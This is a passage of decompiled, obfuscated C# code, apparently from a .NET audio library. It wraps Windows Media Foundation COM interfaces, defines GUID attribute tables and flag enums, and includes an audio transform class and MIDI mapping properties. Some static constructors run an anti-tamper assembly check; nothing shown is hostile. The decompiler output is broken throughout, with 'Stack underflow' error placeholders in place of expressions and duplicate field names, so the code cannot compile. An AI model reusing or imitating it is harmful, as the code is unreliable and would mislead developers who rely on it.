		_0094 = 212,
		_0095 = 213,
		_0096 = 214,
		_0097 = 215,
		_0098 = 216,
		_0099 = 217,
		_009A = 218,
		_009B = 219,
		_009C = 220,
		_009D = 221,
		_009E = 222,
		_009F = 300,
		_0001_0002 = 301,
		_0002_0002 = 302,
		_0003_0002 = 303,
		_0004_0002 = 304,
		_0005_0002 = 305,
		_0006_0002 = 306,
		_0007_0002 = 307,
		_0008_0002 = 308,
		_000E_0002 = 309,
		_000F_0002 = 310,
		_0010_0002 = 311,
		_0011_0002 = 312,
		_0012_0002 = 313,
		_0013_0002 = 314,
		_0014_0002 = 315,
		_0015_0002 = 316,
		_0016_0002 = 317,
		_0017_0002 = 318,
		_0018_0002 = 319,
		_0019_0002 = 320,
		_001A_0002 = 321,
		_001B_0002 = 400,
		_001C_0002 = 401,
		_001D_0002 = 402,
		_001E_0002 = 403,
		_001F_0002 = 500,
		_007F_0002 = 501,
		_0080_0002 = 502,
		_0081_0002 = 503,
		_0082_0002 = 506,
		_0083_0002 = 508,
		_0084_0002 = 513,
		_0086_0002 = 514,
		_0087_0002 = 515,
		_0088_0002 = 516,
		_0089_0002 = 600,
		_008A_0002 = 601,
		_008B_0002 = 602,
		_008C_0002 = 603,
		_008D_0002 = 604
	}
}
namespace _0004
{
	internal static class _0011
	{
		public static readonly Guid _0001;

		public static readonly Guid _0002;

		[global::_0007._0010("Transform Flags")]
		public static readonly Guid _0003;

		[global::_0007._0010("Transform Category")]
		public static readonly Guid _0004;

		[global::_0007._0010("Class identifier")]
		public static readonly Guid _0005;

		[global::_0007._0010("Input Types")]
		public static readonly Guid _0006;

		[global::_0007._0010("Output Types")]
		public static readonly Guid _0007;

		public static readonly Guid _0008;

		[global::_0007._0010("Name")]
		public static readonly Guid _000E;

		public static readonly Guid _000F;

		public static readonly Guid _0010;

		[global::_0007._0010("Preferred Output Format")]
		public static readonly Guid _0011;

		public static readonly Guid _0012;

		public static readonly Guid _0013;

		public static readonly Guid _0014;

		public static readonly Guid _0015;

		public static readonly Guid _0016;

		public static readonly Guid _0017;

		[global::_0007._0010("PMP Host Context")]
		public static readonly Guid _0018;

		[global::_0007._0010("App Context")]
		public static readonly Guid _0019;

		[global::_0007._0010("Duration")]
		public static readonly Guid _001A;

		[global::_0007._0010("Total File Size")]
		public static readonly Guid _001B;

		[global::_0007._0010("Audio encoding bitrate")]
		public static readonly Guid _001C;

		[global::_0007._0010("Video Encoding Bitrate")]
		public static readonly Guid _001D;

		[global::_0007._0010("MIME Type")]
		public static readonly Guid _001E;

		[global::_0007._0010("Last Modified Time")]
		public static readonly Guid _001F;

		[global::_0007._0010("Element ID")]
		public static readonly Guid _007F;

		[global::_0007._0010("Preferred Language")]
		public static readonly Guid _0080;

		[global::_0007._0010("Playback boundary time")]
		public static readonly Guid _0081;

		[global::_0007._0010("Audio is variable bitrate")]
		public static readonly Guid _0082;

		[global::_0007._0010("Major Media Type")]
		public static readonly Guid _0083;

		[global::_0007._0010("Media Subtype")]
		public static readonly Guid _0084;

		[global::_0007._0010("Audio block alignment")]
		public static readonly Guid _0086;

		[global::_0007._0010("Audio average bytes per second")]
		public static readonly Guid _0087;

		[global::_0007._0010("Audio number of channels")]
		public static readonly Guid _0088;

		[global::_0007._0010("Audio samples per second")]
		public static readonly Guid _0089;

		[global::_0007._0010("Audio bits per sample")]
		public static readonly Guid _008A;

		[global::_0007._0010("Enable Hardware Transforms")]
		public static readonly Guid _008B;

		[global::_0007._0010("User data")]
		public static readonly Guid _008C;

		[global::_0007._0010("All samples independent")]
		public static readonly Guid _008D;

		[global::_0007._0010("Fixed size samples")]
		public static readonly Guid _008E;

		[global::_0007._0010("DirectShow Format Guid")]
		public static readonly Guid _008F;

		[global::_0007._0010("Preferred legacy format structure")]
		public static readonly Guid _0090;

		[global::_0007._0010("Is Compressed")]
		public static readonly Guid _0091;

		[global::_0007._0010("Average bitrate")]
		public static readonly Guid _0092;

		[global::_0007._0010("AAC payload type")]
		public static readonly Guid _0093;

		[global::_0007._0010("AAC Audio Profile Level Indication")]
		public static readonly Guid _0094;

		static _0011()
		{
			//IL_0465: Incompatible stack heights: 0 vs 1
			bool flag = false;
			global::_0001._0001();
			Assembly assembly = (Assembly)/*Error near IL_046b: Stack underflow*/;
			Uri uri = new Uri(global::_0003._007E_0080(global::_0003._007E_0080(global::_0002._007E_0002(assembly), global::_0080._0014._0001(107396751), global::_0080._0014._0001(107396746)), global::_0080._0014._0001(107396741), global::_0080._0014._0001(107396736)));
			if (!global::_0011._0018._0001(global::_0002._007E_0003(uri), true, out flag) || !flag || !global::_0004._007E_0081(global::_0002._007E_0004(assembly), global::_0080._0014._0001(107396763)))
			{
				throw new SecurityException(global::_0080._0014._0001(107396706));
			}
			_0001 = new Guid(global::_0080._0014._0001(107410253));
			_0002 = new Guid(global::_0080._0014._0001(107410236));
			_0003 = new Guid(global::_0080._0014._0001(107409643));
			_0004 = new Guid(global::_0080._0014._0001(107409626));
			_0005 = new Guid(global::_0080._0014._0001(107409545));
			_0006 = new Guid(global::_0080._0014._0001(107409528));
			_0007 = new Guid(global::_0080._0014._0001(107409447));
			_0008 = new Guid(global::_0080._0014._0001(107409430));
			_000E = new Guid(global::_0080._0014._0001(107409861));
			_000F = new Guid(global::_0080._0014._0001(107409844));
			_0010 = new Guid(global::_0080._0014._0001(107409763));
			_0011 = new Guid(global::_0080._0014._0001(107409746));
			_0012 = new Guid(global::_0080._0014._0001(107409665));
			_0013 = new Guid(global::_0080._0014._0001(107409136));
			_0014 = new Guid(global::_0080._0014._0001(107409087));
			_0015 = new Guid(global::_0080._0014._0001(107409006));
			_0016 = new Guid(global::_0080._0014._0001(107408989));
			_0017 = new Guid(global::_0080._0014._0001(107408908));
			_0018 = new Guid(global::_0080._0014._0001(107409403));
			_0019 = new Guid(global::_0080._0014._0001(107409322));
			_001A = new Guid(global::_0080._0014._0001(107409305));
			_001B = new Guid(global::_0080._0014._0001(107409224));
			_001C = new Guid(global::_0080._0014._0001(107409207));
			_001D = new Guid(global::_0080._0014._0001(107408614));
			_001E = new Guid(global::_0080._0014._0001(107408597));
			_001F = new Guid(global::_0080._0014._0001(107408516));
			_007F = new Guid(global::_0080._0014._0001(107408499));
			_0080 = new Guid(global::_0080._0014._0001(107408418));
			_0081 = new Guid(global::_0080._0014._0001(107408401));
			_0082 = new Guid(global::_0080._0014._0001(107408832));
			_0083 = new Guid(global::_0080._0014._0001(107408783));
			_0084 = new Guid(global::_0080._0014._0001(107408766));
			_0086 = new Guid(global::_0080._0014._0001(107408685));
			_0087 = new Guid(global::_0080._0014._0001(107408668));
			_0088 = new Guid(global::_0080._0014._0001(107408075));
			_0089 = new Guid(global::_0080._0014._0001(107408058));
			_008A = new Guid(global::_0080._0014._0001(107407977));
			_008B = new Guid(global::_0080._0014._0001(107407960));
			_008C = new Guid(global::_0080._0014._0001(107407879));
			_008D = new Guid(global::_0080._0014._0001(107408374));
			_008E = new Guid(global::_0080._0014._0001(107408293));
			_008F = new Guid(global::_0080._0014._0001(107408276));
			_0090 = new Guid(global::_0080._0014._0001(107408195));
			_0091 = new Guid(global::_0080._0014._0001(107408178));
			_0092 = new Guid(global::_0080._0014._0001(107407585));
			_0093 = new Guid(global::_0080._0014._0001(107407568));
			_0094 = new Guid(global::_0080._0014._0001(107407519));
		}
	}
}
namespace _001B
{
	internal static class _0013
	{
		internal static bool _0001;
	}
}
namespace _001D
{
	internal static class _0013
	{
		public const int _0001 = -2;

		public const int _0002 = -3;

		public const int _0003 = -4;

		public const int _0004 = -1;

		public const int _0005 = 2;

		public const int _0006 = 112;

		public const int _0007 = 131184;

		static _0013()
		{
			//IL_00bb: Incompatible stack heights: 0 vs 1
			bool flag = false;
			global::_0001._0001();
			Assembly assembly;
			if (true)
			{
				assembly = (Assembly)/*Error near IL_00c1: Stack underflow*/;
			}
			Uri uri = new Uri(global::_0003._007E_0080(global::_0003._007E_0080(global::_0002._007E_0002(assembly), _0080._0014._0001(107396751), _0080._0014._0001(107396746)), _0080._0014._0001(107396741), _0080._0014._0001(107396736)));
			if (global::_0011._0018._0001(global::_0002._007E_0003(uri), true, out flag) && flag && global::_0004._007E_0081(global::_0002._007E_0004(assembly), _0080._0014._0001(107396763)))
			{
				return;
			}
			throw new SecurityException(_0080._0014._0001(107396706));
		}
	}
}
namespace _0011
{
	[ComImport]
	[InterfaceType(ComInterfaceType.InterfaceIsIUnknown)]
	[Guid("ad4c1b00-4bf7-422f-9175-756693d9130d")]
	public interface _0010
	{
		void _0001(ref int _0002);

		void _0001(ref long _0002);

		void _0001(long _0002);

		void _0002(ref long _0002);

		void _0002(long _0002);

		void _0001([MarshalAs(UnmanagedType.Bool)] ref bool _0002);

		void _0001(IntPtr _0002, int _0003, ref int _0004);

		void _0001(IntPtr _0002, int _0003, IntPtr _0004, IntPtr _0005);

		void _0001(IntPtr _0002, ref int _0003);

		void _0002(IntPtr _0002, int _0003, ref int _0004);

		void _0002(IntPtr _0002, int _0003, IntPtr _0004, IntPtr _0005);

		void _0002(IntPtr _0002, ref int _0003);

		void _0001(int _0002, long _0003, int _0004, ref long _0005);

		void _0001();

		void _0002();
	}
}
namespace _0018
{
	[ComImport]
	[InterfaceType(ComInterfaceType.InterfaceIsIUnknown)]
	[Guid("045FA593-8799-42b8-BC8D-8968C6453507")]
	public interface _0015
	{
		void _0001(out IntPtr _0002, out int _0003, out int _0004);

		void _0001();

		void _0001(out int _0002);

		void _0001(int _0002);

		void _0002(out int _0002);
	}
}
namespace _0019
{
	[ComImport]
	[InterfaceType(ComInterfaceType.InterfaceIsIUnknown)]
	[Guid("44AE0FA8-EA31-4109-8D2E-4CAE4997C555")]
	public interface _0012 : global::_0008._000E
	{
		new void _0001([In][MarshalAs(UnmanagedType.LPStruct)] Guid _0002, [In][Out] IntPtr _0003);

		new void _0001([In][MarshalAs(UnmanagedType.LPStruct)] Guid _0002, out int _0003);

		new void _0001([In][MarshalAs(UnmanagedType.LPStruct)] Guid _0002, IntPtr _0003, [MarshalAs(UnmanagedType.Bool)] out bool _0004);

		new void _0001([MarshalAs(UnmanagedType.Interface)] global::_0008._000E _0002, int _0003, [MarshalAs(UnmanagedType.Bool)] out bool _0004);

		new void _0002([In][MarshalAs(UnmanagedType.LPStruct)] Guid _0002, out int _0003);

		new void _0001([In][MarshalAs(UnmanagedType.LPStruct)] Guid _0002, out long _0003);

		new void _0001([In][MarshalAs(UnmanagedType.LPStruct)] Guid _0002, out double _0003);

		new void _0001([In][MarshalAs(UnmanagedType.LPStruct)] Guid _0002, out Guid _0003);

		new void _0003([In][MarshalAs(UnmanagedType.LPStruct)] Guid _0002, out int _0003);

		new void _0001([In][MarshalAs(UnmanagedType.LPStruct)] Guid _0002, [Out][MarshalAs(UnmanagedType.LPWStr)] StringBuilder _0003, int _0004, out int _0005);

		new void _0001([In][MarshalAs(UnmanagedType.LPStruct)] Guid _0002, [MarshalAs(UnmanagedType.LPWStr)] out string _0003, out int _0004);

		new void _0004([In][MarshalAs(UnmanagedType.LPStruct)] Guid _0002, out int _0003);

		new void _0001([In][MarshalAs(UnmanagedType.LPStruct)] Guid _0002, [Out][MarshalAs(UnmanagedType.LPArray)] byte[] _0003, int _0004, out int _0005);

		new void _0001([In][MarshalAs(UnmanagedType.LPStruct)] Guid _0002, out IntPtr _0003, out int _0004);

		new void _0001([In][MarshalAs(UnmanagedType.LPStruct)] Guid _0002, [In][MarshalAs(UnmanagedType.LPStruct)] Guid _0003, [MarshalAs(UnmanagedType.IUnknown)] out object _0004);

		new void _0002([In][MarshalAs(UnmanagedType.LPStruct)] Guid _0002, IntPtr _0003);

		new void _0001([In][MarshalAs(UnmanagedType.LPStruct)] Guid _0002);

		new void _0001();

		new void _0001([In][MarshalAs(UnmanagedType.LPStruct)] Guid _0002, int _0003);

		new void _0001([In][MarshalAs(UnmanagedType.LPStruct)] Guid _0002, long _0003);

		new void _0001([In][MarshalAs(UnmanagedType.LPStruct)] Guid _0002, double _0003);

		new void _0001([In][MarshalAs(UnmanagedType.LPStruct)] Guid _0002, [In][MarshalAs(UnmanagedType.LPStruct)] Guid _0003);

		new void _0001([In][MarshalAs(UnmanagedType.LPStruct)] Guid _0002, [In][MarshalAs(UnmanagedType.LPWStr)] string _0003);

		new void _0001([In][MarshalAs(UnmanagedType.LPStruct)] Guid _0002, [In][MarshalAs(UnmanagedType.LPArray, SizeParamIndex = 2)] byte[] _0003, int _0004);

		new void _0001([MarshalAs(UnmanagedType.LPStruct)] Guid _0002, [In][MarshalAs(UnmanagedType.IUnknown)] object _0003);

		new void _0002();

		new void _0003();

		new void _0001(out int _0002);

		new void _0001(int _0002, out Guid _0003, [In][Out] IntPtr _0004);

		new void _0001([In][MarshalAs(UnmanagedType.Interface)] global::_0008._000E _0002);

		void _0001(out Guid _0002);

		void _0001([MarshalAs(UnmanagedType.Bool)] out bool _0002);

		[PreserveSig]
		int _0001([In][MarshalAs(UnmanagedType.Interface)] _0012 _0002, ref int _0003);

		void _0001([In] Guid _0002, ref IntPtr _0003);

		void _0003([In] Guid _0002, [In] IntPtr _0003);
	}
}
namespace _0016
{
	[ComImport]
	[InterfaceType(ComInterfaceType.InterfaceIsIUnknown)]
	[Guid("c40a00f2-b93a-4d80-ae8c-5a1c634f58e4")]
	public interface _0015 : global::_0008._000E
	{
		new void _0001([In][MarshalAs(UnmanagedType.LPStruct)] Guid _0002, [In][Out] IntPtr _0003);

		new void _0001([In][MarshalAs(UnmanagedType.LPStruct)] Guid _0002, out int _0003);

		new void _0001([In][MarshalAs(UnmanagedType.LPStruct)] Guid _0002, IntPtr _0003, [MarshalAs(UnmanagedType.Bool)] out bool _0004);

		new void _0001([MarshalAs(UnmanagedType.Interface)] global::_0008._000E _0002, int _0003, [MarshalAs(UnmanagedType.Bool)] out bool _0004);

		new void _0002([In][MarshalAs(UnmanagedType.LPStruct)] Guid _0002, out int _0003);

		new void _0001([In][MarshalAs(UnmanagedType.LPStruct)] Guid _0002, out long _0003);

		new void _0001([In][MarshalAs(UnmanagedType.LPStruct)] Guid _0002, out double _0003);

		new void _0001([In][MarshalAs(UnmanagedType.LPStruct)] Guid _0002, out Guid _0003);

		new void _0003([In][MarshalAs(UnmanagedType.LPStruct)] Guid _0002, out int _0003);

		new void _0001([In][MarshalAs(UnmanagedType.LPStruct)] Guid _0002, [Out][MarshalAs(UnmanagedType.LPWStr)] StringBuilder _0003, int _0004, out int _0005);

		new void _0001([In][MarshalAs(UnmanagedType.LPStruct)] Guid _0002, [MarshalAs(UnmanagedType.LPWStr)] out string _0003, out int _0004);

		new void _0004([In][MarshalAs(UnmanagedType.LPStruct)] Guid _0002, out int _0003);

		new void _0001([In][MarshalAs(UnmanagedType.LPStruct)] Guid _0002, [Out][MarshalAs(UnmanagedType.LPArray)] byte[] _0003, int _0004, out int _0005);

		new void _0001([In][MarshalAs(UnmanagedType.LPStruct)] Guid _0002, out IntPtr _0003, out int _0004);

		new void _0001([In][MarshalAs(UnmanagedType.LPStruct)] Guid _0002, [In][MarshalAs(UnmanagedType.LPStruct)] Guid _0003, [MarshalAs(UnmanagedType.IUnknown)] out object _0004);

		new void _0002([In][MarshalAs(UnmanagedType.LPStruct)] Guid _0002, IntPtr _0003);

		new void _0001([In][MarshalAs(UnmanagedType.LPStruct)] Guid _0002);

		new void _0001();

		new void _0001([In][MarshalAs(UnmanagedType.LPStruct)] Guid _0002, int _0003);

		new void _0001([In][MarshalAs(UnmanagedType.LPStruct)] Guid _0002, long _0003);

		new void _0001([In][MarshalAs(UnmanagedType.LPStruct)] Guid _0002, double _0003);

		new void _0001([In][MarshalAs(UnmanagedType.LPStruct)] Guid _0002, [In][MarshalAs(UnmanagedType.LPStruct)] Guid _0003);

		new void _0001([In][MarshalAs(UnmanagedType.LPStruct)] Guid _0002, [In][MarshalAs(UnmanagedType.LPWStr)] string _0003);

		new void _0001([In][MarshalAs(UnmanagedType.LPStruct)] Guid _0002, [In][MarshalAs(UnmanagedType.LPArray, SizeParamIndex = 2)] byte[] _0003, int _0004);

		new void _0001([MarshalAs(UnmanagedType.LPStruct)] Guid _0002, [In][MarshalAs(UnmanagedType.IUnknown)] object _0003);

		new void _0002();

		new void _0003();

		new void _0001(out int _0002);

		new void _0001(int _0002, out Guid _0003, [In][Out] IntPtr _0004);

		new void _0001([In][MarshalAs(UnmanagedType.Interface)] global::_0008._000E _0002);

		void _0002(out int _0002);

		void _0001(int _0002);

		void _0001(out long _0002);

		void _0001(long _0002);

		void _0002(out long _0002);

		void _0002(long _0002);

		void _0003(out int _0002);

		void _0001(int _0002, out global::_0018._0015 _0003);

		void _0001(out global::_0018._0015 _0002);

		void _0001(global::_0018._0015 _0002);

		void _0002(int _0002);

		void _0004();

		void _0004(out int _0002);

		void _0002(global::_0018._0015 _0002);
	}
}
namespace _0007
{
	[ComImport]
	[InterfaceType(ComInterfaceType.InterfaceIsIUnknown)]
	[Guid("70ae66f2-c809-4e4f-8915-bdcb406b7993")]
	public interface _0013
	{
		void _0001([In] int _0002, [MarshalAs(UnmanagedType.Bool)] out bool _0003);

		void _0001([In] int _0002, [In][MarshalAs(UnmanagedType.Bool)] bool _0003);

		void _0001([In] int _0002, [In] int _0003, out global::_0019._0012 _0004);

		void _0001([In] int _0002, out global::_0019._0012 _0003);

		void _0001([In] int _0002, IntPtr _0003, [In] global::_0019._0012 _0004);

		void _0001([In][MarshalAs(UnmanagedType.LPStruct)] Guid _0002, [In] IntPtr _0003);

		void _0001([In] int _0002, [In] int _0003, out int _0004, out MF_SOURCE_READER_FLAG _0005, out ulong _0006, out global::_0016._0015 _0007);

		void _0001([In] int _0002);

		void _0001([In] int _0002, [In][MarshalAs(UnmanagedType.LPStruct)] Guid _0003, [In][MarshalAs(UnmanagedType.LPStruct)] Guid _0004, out IntPtr _0005);

		[PreserveSig]
		int _0001([In] int _0002, [In][MarshalAs(UnmanagedType.LPStruct)] Guid _0003, [Out] IntPtr _0004);
	}
}
namespace _000E
{
	internal static class _0017
	{
		[global::_0007._0010("Video Decoder")]
		public static readonly Guid _0001;

		[global::_0007._0010("Video Encoder")]
		public static readonly Guid _0002;

		[global::_0007._0010("Video Effect")]
		public static readonly Guid _0003;

		[global::_0007._0010("Multiplexer")]
		public static readonly Guid _0004;

		[global::_0007._0010("Demultiplexer")]
		public static readonly Guid _0005;

		[global::_0007._0010("Audio Decoder")]
		public static readonly Guid _0006;

		[global::_0007._0010("Audio Encoder")]
		public static readonly Guid _0007;

		[global::_0007._0010("Audio Effect")]
		public static readonly Guid _0008;

		[global::_0007._0010("Video Processor")]
		public static readonly Guid _000E;

		[global::_0007._0010("Other")]
		public static readonly Guid _000F;

		static _0017()
		{
			//IL_00ce: Incompatible stack heights: 0 vs 1
			//IL_00d8: Incompatible stack heights: 0 vs 1
			//IL_00e2: Incompatible stack heights: 0 vs 1
			_0080._0014._0001(107407438);
			new Guid((string)/*Error near IL_00d8: Stack underflow*/);
			_0001 = (Guid)/*Error near IL_0014: Stack underflow*/;
			_0080._0014._0001(107407417);
			_0002 = new Guid((string)/*Error near IL_0023: Stack underflow*/);
			_0003 = new Guid(_0080._0014._0001(107407844));
			_0004 = new Guid(_0080._0014._0001(107407791));
			_0005 = new Guid(_0080._0014._0001(107407770));
			_0006 = new Guid(_0080._0014._0001(107407685));
			_0007 = new Guid(_0080._0014._0001(107407664));
			_0008 = new Guid(_0080._0014._0001(107407099));
			_000E = new Guid(_0080._0014._0001(107407014));
			_000F = new Guid(_0080._0014._0001(107406993));
		}
	}
}
namespace _0015
{
	internal struct _0011
	{
		public long _0001;

		public global::_0004._0012 _0001;

		public int _0001;

		public int _0002;

		public int _0003;
	}
}
namespace _000F
{
	internal struct _000E
	{
		public int _0001;

		public _0016._0015 _0001;

		public _001A._000F _0001;

		public _001A._000E _0001;
	}
}
namespace _0001
{
	internal struct _0012
	{
		public global::_001A._0010 _0001;

		public int _0001;

		public int _0002;
	}
}
namespace _0006
{
	internal enum _0011
	{
		_0001 = 0,
		_0002 = 1,
		_0003 = 2,
		_0004 = 3,
		_0005 = 4,
		_0006 = 268435456,
		_0007 = 268435457,
		_0008 = 268435458,
		_000E = 268435459,
		_000F = 536870912
	}
}
namespace _0010
{
	[StructLayout(LayoutKind.Sequential)]
	internal sealed class _0014
	{
		public Guid _0001;

		public Guid _0002;

		static _0014()
		{
			//IL_00bb: Incompatible stack heights: 0 vs 1
			bool flag = false;
			global::_0001._0001();
			Assembly assembly;
			if (true)
			{
				assembly = (Assembly)/*Error near IL_00c1: Stack underflow*/;
			}
			Uri uri = new Uri(global::_0003._007E_0080(global::_0003._007E_0080(global::_0002._007E_0002(assembly), global::_0080._0014._0001(107396751), global::_0080._0014._0001(107396746)), global::_0080._0014._0001(107396741), global::_0080._0014._0001(107396736)));
			if (global::_0011._0018._0001(global::_0002._007E_0003(uri), true, out flag) && flag && global::_0004._007E_0081(global::_0002._007E_0004(assembly), global::_0080._0014._0001(107396763)))
			{
				return;
			}
			throw new SecurityException(global::_0080._0014._0001(107396706));
		}
	}
}
namespace _001F
{
	[StructLayout(LayoutKind.Sequential)]
	internal sealed class _0012
	{
		public int _0001;

		public long _0001;

		public long _0002;

		public long _0003;

		public long _0004;

		public long _0005;

		public long _0006;

		public long _0007;

		public long _0008;

		public long _000E;

		public int _0002;

		public long _000F;

		public int _0003;

		public int _0004;

		public int _0005;

		public int _0006;
	}
}
namespace _0001
{
	[Flags]
	internal enum _0013
	{
		_0001 = 0,
		_0002 = 1,
		_0003 = 2,
		_0004 = 4,
		_0005 = 8,
		_0006 = 0x10,
		_0007 = 0x20,
		_0008 = 0x40,
		_000E = 0x3F
	}
}
namespace _0012
{
	[Flags]
	internal enum _000F
	{
		_0001 = 0,
		_0002 = 1
	}
}
namespace _0004
{
	[Flags]
	internal enum _0012
	{
		_0001 = 0,
		_0002 = 1,
		_0003 = 2,
		_0004 = 4,
		_0005 = 8,
		_0006 = 0x100,
		_0007 = 0x200,
		_0008 = 0x400,
		_000E = 0x800
	}
}
namespace _001A
{
	[Flags]
	internal enum _000F
	{
		_0001 = 0,
		_0002 = 0x1000000,
		_0003 = 0x100,
		_0004 = 0x200,
		_0005 = 0x300
	}
}
namespace _0011
{
	[Flags]
	internal enum _0011
	{
		_0001 = 0,
		_0002 = 1
	}
}
namespace _001A
{
	[Flags]
	internal enum _0010
	{
		_0001 = 0,
		_0002 = 1,
		_0003 = 2,
		_0004 = 4,
		_0005 = 8,
		_0006 = 0x10,
		_0007 = 0x100,
		_0008 = 0x200,
		_000E = 0x400,
		_000F = 0x800
	}
}
namespace _007F
{
	[Flags]
	internal enum _0012
	{
		_0001 = 0,
		_0002 = 1,
		_0003 = 2
	}
}
namespace _0019
{
	[Flags]
	internal enum _0013
	{
		_0001 = 0,
		_0002 = 0x100
	}
}
namespace _0013
{
	[Flags]
	internal enum _0013
	{
		_0001 = 0,
		_0002 = 1
	}
}
namespace _0001
{
	internal sealed class _0014 : IDisposable, _0004
	{
		private global::_0007._0005 m__0001;

		private global::_0005._0005 m__0001;

		private global::_0004._0005 m__0001;

		private global::_000E._0003 m__0001;

		private bool m__0001;

		public global::_0005._0005 OutputFormat => ((_0014)/*Error near IL_0007: Stack underflow*/).m__0001;

		public _0014(global::_0005._0005 _0089_008F_0006)
		{
			this.m__0001 = new global::_0007._0005();
			if (!global::_0011._0018._0001(_0089_008F_0006, 0, this.m__0001._0001))
			{
				throw new ArgumentException(global::_0080._0014._0001(107406940));
			}
			global::_0011._0018._0001(this.m__0001._0001, 0, _0089_008F_0006);
			this.m__0001 = new global::_0005._0005(_0089_008F_0006._0001, _0089_008F_0006._0001);
			global::_001E._0004 obj = this.m__0001._0001;
			global::_0005._0005 obj2 = this.m__0001;
			if (!global::_0011._0018._0001(0, obj2, obj))
			{
				throw new ArgumentException(string.Format(global::_0080._0014._0001(107406907), this.m__0001));
			}
			global::_0011._0018._0001(this.m__0001._0001, 0, this.m__0001);
			this.m__0001 = new global::_0004._0005(_0089_008F_0006._0002);
			this.m__0001 = new global::_000E._0003(this.m__0001._0002);
		}

		public int _0001(global::_0005._0003 _0002, byte[] _0003, int _0004)
		{
			//IL_00d0: Incompatible stack heights: 0 vs 1
			//IL_00dc: Incompatible stack heights: 0 vs 1
			global::_0004._0005 obj = ((_0014)/*Error near IL_000a: Stack underflow*/).m__0001;
			byte[] array = ((global::_0005._0003)/*Error near IL_0019: Stack underflow*/).RawData;
			int num = _0002.FrameLength;
			global::_0011._0018._0001(array, num, obj);
			if (this.m__0001)
			{
				global::_0011._0018._0001(this.m__0001._0001);
				this.m__0001 = false;
			}
			global::_0011._0018._0001(this.m__0001._0001, 0, (global::_0010._0004)this.m__0001, global::_000F._0004._0001, 0L, 0L);
			this.m__0001.MediaBuffer._0002(0);
			this.m__0001.StatusFlags = global::_0010._0003._0001;
			global::_0011._0018._0001(this.m__0001._0001, global::_001A._0001._0001, 1, new global::_000E._0003[1] { this.m__0001 });
			if (this.m__0001.Length == 0)
			{
				return 0;
			}
			this.m__0001._0001(_0003, _0004);
			return this.m__0001.Length;
		}

		public void _0001()
		{
			//IL_000a: Incompatible stack heights: 0 vs 1
			((_0014)/*Error near IL_0008: Stack underflow*/).m__0001 = true;
		}

		public void _0002()
		{
			//IL_0040: Incompatible stack heights: 0 vs 1
			//IL_0043: Incompatible stack heights: 0 vs 1
			if (((_0014)/*Error near IL_0007: Stack underflow*/).m__0001 != null)
			{
				((_0014)/*Error near IL_0010: Stack underflow*/).m__0001._0001();
				this.m__0001 = null;
			}
			this.m__0001._0001();
			if (this.m__0001 != null)
			{
				this.m__0001._0001();
				this.m__0001 = null;
			}
		}

		void IDisposable.Dispose()
		{
			//ILSpy generated this explicit interface implementation from .override directive in 
			this._0002();
		}

		static _0014()
		{
			//IL_00bb: Incompatible stack heights: 0 vs 1
			bool flag = false;
			global::_0001._0001();
			Assembly assembly;
			if (true)
			{
				assembly = (Assembly)/*Error near IL_00c1: Stack underflow*/;
			}
			Uri uri = new Uri(global::_0003._007E_0080(global::_0003._007E_0080(global::_0002._007E_0002(assembly), global::_0080._0014._0001(107396751), global::_0080._0014._0001(107396746)), global::_0080._0014._0001(107396741), global::_0080._0014._0001(107396736)));
			if (global::_0011._0018._0001(global::_0002._007E_0003(uri), true, out flag) && flag && global::_0004._007E_0081(global::_0002._007E_0004(assembly), global::_0080._0014._0001(107396763)))
			{
				return;
			}
			throw new SecurityException(global::_0080._0014._0001(107396706));
		}
	}
}
namespace _000E
{
	internal sealed class _0018
	{
		[CompilerGenerated]
		private string _0001;

		[CompilerGenerated]
		private int _0001;

		[CompilerGenerated]
		private int m__0002;

		[CompilerGenerated]
		private int _0003;

		[CompilerGenerated]
		private int _0004;

		[CompilerGenerated]
		private int _0005;

		[CompilerGenerated]
		private float _0001;

		public string NoteName
		{
			[CompilerGenerated]
			get
			{
				//IL_0009: Incompatible stack heights: 0 vs 1
				return ((_0018)/*Error near IL_0007: Stack underflow*/)._0001;
			}
			[CompilerGenerated]
			set
			{
				//IL_000b: Incompatible stack heights: 0 vs 1
				//IL_000e: Incompatible stack heights: 0 vs 1
				((_0018)/*Error near IL_0009: Stack underflow*/)._0001 = (string)/*Error near IL_0009: Stack underflow*/;
			}
		}

		public int InNote
		{
			[CompilerGenerated]
			get
			{
				//IL_0009: Incompatible stack heights: 0 vs 1
				return ((_0018)/*Error near IL_0007: Stack underflow*/)._0001;
			}
			[CompilerGenerated]
			set
			{
				//IL_000b: Incompatible stack heights: 0 vs 1
				//IL_000e: Incompatible stack heights: 0 vs 1
				((_0018)/*Error near IL_0009: Stack underflow*/)._0001 = (int)/*Error near IL_0009: Stack underflow*/;
			}
		}

		public int OutNote
		{
			[CompilerGenerated]
			get
			{
				//IL_0009: Incompatible stack heights: 0 vs 1
				return ((_0018)/*Error near IL_0007: Stack underflow*/).m__0002;
			}
			[CompilerGenerated]
			set
			{
				//IL_000b: Incompatible stack heights: 0 vs 1
				//IL_000e: Incompatible stack heights: 0 vs 1
				((_0018)/*Error near IL_0009: Stack underflow*/).m__0002 = (int)/*Error near IL_0009: Stack underflow*/;
			}
		}

		public int OutPort
		{
			[CompilerGenerated]
			get
			{
				//IL_0009: Incompatible stack heights: 0 vs 1
				return ((_0018)/*Error near IL_0007: Stack underflow*/)._0003;
			}
			[CompilerGenerated]
			set
			{
				//IL_000b: Incompatible stack heights: 0 vs 1
				//IL_000e: Incompatible stack heights: 0 vs 1
				((_0018)/*Error near IL_0009: Stack underflow*/)._0003 = (int)/*Error near IL_0009: Stack underflow*/;
			}
		}

		public int Channel
		{
			[CompilerGenerated]
			get
			{
				//IL_0009: Incompatible stack heights: 0 vs 1
				return ((_0018)/*Error near IL_0007: Stack underflow*/)._0004;
			}
			[CompilerGenerated]
			set
			{
				//IL_000b: Incompatible stack heights: 0 vs 1
				//IL_000e: Incompatible stack heights: 0 vs 1
				((_0018)/*Error near IL_0009: Stack underflow*/)._0004 = (int)/*Error near IL_0009: Stack underflow*/;
			}
		}

		public int VelocityAdjust
		{
			[CompilerGenerated]
			get
			{
				//IL_0009: Incompatible stack heights: 0 vs 1
				return ((_0018)/*Error near IL_0007: Stack underflow*/)._0005;
			}
			[CompilerGenerated]
			set
			{
				//IL_000b: Incompatible stack heights: 0 vs 1
				//IL_000e: Incompatible stack heights: 0 vs 1
				((_0018)/*Error near IL_0009: Stack underflow*/)._0005 = (int)/*Error near IL_0009: Stack underflow*/;
			}
		}

		public float VelocityScale
		{
			[CompilerGenerated]
			get
			{
				//IL_0009: Incompatible stack heights: 0 vs 1
				return ((_0018)/*Error near IL_0007: Stack underflow*/)._0001;
			}
			[CompilerGenerated]
			set
			{
				//IL_000b: Incompatible stack heights: 0 vs 1
